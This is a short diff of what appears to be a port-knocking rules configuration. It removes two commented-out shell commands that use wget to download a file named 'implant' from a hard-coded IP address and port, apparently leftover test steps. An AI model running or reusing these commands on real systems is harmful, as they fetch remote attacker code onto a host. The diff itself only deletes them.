@@ -8,6 +8,3 @@ rules:
       - 28977
       - 51234
 
-
-# && sleep 5 && wget http://192.42.1.174:8000 -O test4-implant"
-#command: "touch /home/john/pre-knock.txt && sleep 60 && cd /home/john && wget http://192.42.1.174:8000 -O implant && touch /home/john/knock.txt"
